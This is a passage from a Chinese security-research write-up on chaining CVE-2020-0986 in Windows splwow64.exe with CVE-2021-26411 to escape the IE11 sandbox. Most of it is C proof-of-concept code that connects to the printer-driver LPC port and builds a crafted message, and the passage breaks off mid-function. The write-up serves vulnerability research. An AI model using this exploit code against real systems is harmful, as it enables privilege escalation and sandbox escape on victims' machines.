**作者：Muoziiy@天玄安全实验室**  
**原文链接：**
## 前言
这篇文章描述如何利用CVE-2020-0986实现IE沙箱逃逸。
本文不会给出完整的利用代码，只分享一些漏洞利用思路。
2021年4月30日，安恒威胁情报中心发布了一篇[《深入分析 CVE-2021-26411
IE浏览器UAF漏洞》](https://mp.weixin.qq.com/s?__biz=MzI1MDU5NjYwNg==&mid=2247489493&idx=1&sn=146720b9aa2c5d5b75679e1691cfe231&chksm=e9fe8a44de890352b91696cf57b30c8360f3ab2306ae2e779a5bd2325ef401d4aae5349efc93&scene=178&cur_album_id=1793105970730975235#rd)，里面详细分析了该漏洞的原理和利用过程，文章最后提到
"这种IE漏洞在IE11环境中需要配合一个提权漏洞才能实现代码执行，目前还未见到对这个漏洞配套使用的提权漏洞的披露"，所以本人以研究学习为目的，通过参考
@iamelli0t师傅在2020看雪SDC的演讲内容 [《逃逸IE浏览器沙箱：在野0Day漏洞利用复现
》](https://zhuanlan.kanxue.com/article-14133.htm)，复现了CVE-2020-0986的提权EXP，并配合CVE-2021-26411实现了IE
11沙箱逃逸。
## 漏洞概述
CVE-2021-26411已经在安恒的文章中已经做了详细描述，这里就不在介绍。
CVE-2020-0986是用户模式下打印机驱动主进程splwow64.exe存在任意指针取消引用漏洞，该漏洞允许使用任意参数在splwow64.exe进程空间内调用Memcpy函数，这实际上是在splwow64.exe进程空间内实现了一个任意地址写的原语。因为splwow64.exe是IE提权策略的白名单进程，所以可以利用IE的代码执行启动splwow64.exe进程，并通过发送特定LPC消息来操纵splwow64.exe进程内存，实现在splwow64.exe进程中执行任意代码并逃逸IE
11沙箱。
## POC
本次分析用到的POC来自[google project zero](https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-0986.html)。
    #include ;
    #include "windows.h";
    #include "Shlwapi.h";
    #include "winternl.h";
    typedef struct _PORT_VIEW
    {
            UINT64 Length;
            HANDLE SectionHandle;
            UINT64 SectionOffset;
            UINT64 ViewSize;
            UCHAR* ViewBase;
            UCHAR* ViewRemoteBase;
    } PORT_VIEW, * PPORT_VIEW;
    PORT_VIEW ClientView;
    typedef struct _PORT_MESSAGE_HEADER {
            USHORT DataSize;
            USHORT MessageSize;
            USHORT MessageType;
            USHORT VirtualRangesOffset;
            CLIENT_ID ClientId;
            UINT64 MessageId;
            UINT64 SectionSize;
    } PORT_MESSAGE_HEADER, * PPORT_MESSAGE_HEADER;
    typedef struct _PORT_MESSAGE {
            PORT_MESSAGE_HEADER MessageHeader;
            UINT64 MsgSendLen;
            UINT64 PtrMsgSend;
            UINT64 MsgReplyLen;
            UINT64 PtrMsgReply;
            UCHAR Unk4[0x1F8];
    } PORT_MESSAGE, * PPORT_MESSAGE;
    PORT_MESSAGE LpcRequest;
    PORT_MESSAGE LpcReply;
    NTSTATUS(NTAPI* NtOpenProcessToken)(
            _In_ HANDLE ProcessHandle,
            _In_ ACCESS_MASK DesiredAccess,
            _Out_ PHANDLE TokenHandle
            );
    NTSTATUS(NTAPI* ZwQueryInformationToken)(
            _In_ HANDLE TokenHandle,
            _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
            _Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength) PVOID TokenInformation,
            _In_ ULONG TokenInformationLength,
            _Out_ PULONG ReturnLength
            );
    NTSTATUS(NTAPI* NtCreateSection)(
            PHANDLE            SectionHandle,
            ACCESS_MASK        DesiredAccess,
            POBJECT_ATTRIBUTES ObjectAttributes,
            PLARGE_INTEGER     MaximumSize,
            ULONG              SectionPageProtection,
            ULONG              AllocationAttributes,
            HANDLE             FileHandle
            );
    NTSTATUS(NTAPI* ZwSecureConnectPort)(
            _Out_ PHANDLE PortHandle,
            _In_ PUNICODE_STRING PortName,
            _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos,
            _Inout_opt_ PPORT_VIEW ClientView,
            _In_opt_ PSID Sid,
            _Inout_opt_ PVOID ServerView,
            _Out_opt_ PULONG MaxMessageLength,
            _Inout_opt_ PVOID ConnectionInformation,
            _Inout_opt_ PULONG ConnectionInformationLength
            );
    NTSTATUS(NTAPI* NtRequestWaitReplyPort)(
            IN HANDLE PortHandle,
            IN PPORT_MESSAGE LpcRequest,
            OUT PPORT_MESSAGE LpcReply
            );
    int Init()
    {
            HMODULE ntdll = GetModuleHandleA("ntdll");
            NtOpenProcessToken = (NTSTATUS(NTAPI*) (HANDLE, ACCESS_MASK, PHANDLE)) GetProcAddress(ntdll, "NtOpenProcessToken");
            if (NtOpenProcessToken == NULL)
            {
                    return 0;
            }
            ZwQueryInformationToken = (NTSTATUS(NTAPI*) (HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG)) GetProcAddress(ntdll, "ZwQueryInformationToken");
            if (ZwQueryInformationToken == NULL)
            {
                    return 0;
            }
            NtCreateSection = (NTSTATUS(NTAPI*) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE)) GetProcAddress(ntdll, "NtCreateSection");
            if (NtCreateSection == NULL)
            {
                    return 0;
            }
            ZwSecureConnectPort = (NTSTATUS(NTAPI*) (PHANDLE, PUNICODE_STRING, PSECURITY_QUALITY_OF_SERVICE, PPORT_VIEW, PSID, PVOID, PULONG, PVOID, PULONG)) GetProcAddress(ntdll, "ZwSecureConnectPort");
            if (ZwSecureConnectPort == NULL)
            {
                    return 0;
            }
            NtRequestWaitReplyPort = (NTSTATUS(NTAPI*) (HANDLE, PPORT_MESSAGE, PPORT_MESSAGE)) GetProcAddress(ntdll, "NtRequestWaitReplyPort");
            if (NtRequestWaitReplyPort == NULL)
            {
                    return 0;
            }
            return 1;
    }
    int GetPortName(PUNICODE_STRING DestinationString)
    {
            void* tokenHandle;
            DWORD sessionId;
            ULONG length;
            int tokenInformation[16];
            WCHAR dst[256];
            memset(tokenInformation, 0, sizeof(tokenInformation));
            ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
            memset(dst, 0, sizeof(dst));
            if (NtOpenProcessToken(GetCurrentProcess(), 0x20008u, &tokenHandle)
                    || ZwQueryInformationToken(tokenHandle, TokenStatistics, tokenInformation, 0x38u, &length))
            {
                    return 0;
            }
            wsprintfW(
                    dst,
                    L"\\RPC Control\\UmpdProxy_%x_%x_%x_%x",
                    sessionId,
                    tokenInformation[2],
                    tokenInformation[3],
                    0x2000);
            printf("name: %ls\n", dst);
            RtlInitUnicodeString(DestinationString, dst);
            return 1;
    }
    HANDLE CreatePortSharedBuffer(PUNICODE_STRING PortName)
    {
            HANDLE sectionHandle = 0;
            HANDLE portHandle = 0;
            union _LARGE_INTEGER maximumSize;
            maximumSize.QuadPart = 0x20000;
            if (0 != NtCreateSection(&sectionHandle, SECTION_MAP_WRITE | SECTION_MAP_READ, 0, &maximumSize, PAGE_READWRITE, SEC_COMMIT, NULL)) {
                    return 0;
            }
            if (sectionHandle)
            {
                    ClientView.SectionHandle = sectionHandle;
                    ClientView.Length = 0x30;
                    ClientView.ViewSize = 0x9000;
                    int retval = ZwSecureConnectPort(&portHandle, PortName, NULL, &ClientView, NULL, NULL, NULL, NULL, NULL);
                    if(retval){
                            return 0;
                    }
            }
            return portHandle;
    }
    PVOID PrepareMessage()
    {
            memset(&LpcRequest, 0, sizeof(LpcRequest));
            LpcRequest.MessageHeader.DataSize = 0x20;
            LpcRequest.MessageHeader.MessageSize = 0x48;
            LpcRequest.MsgSendLen = 0x88;
            LpcRequest.PtrMsgSend = (UINT64)ClientView.ViewRemoteBase;
            LpcRequest.MsgReplyLen = 0x10;
            LpcRequest.PtrMsgReply = (UINT64)ClientView.ViewRemoteBase + 0x88;
            memcpy(&LpcReply, &LpcRequest, sizeof(LpcRequest));
            *(UINT64*)ClientView.ViewBase = 0x6D00000000; //Msg Type (Document Event)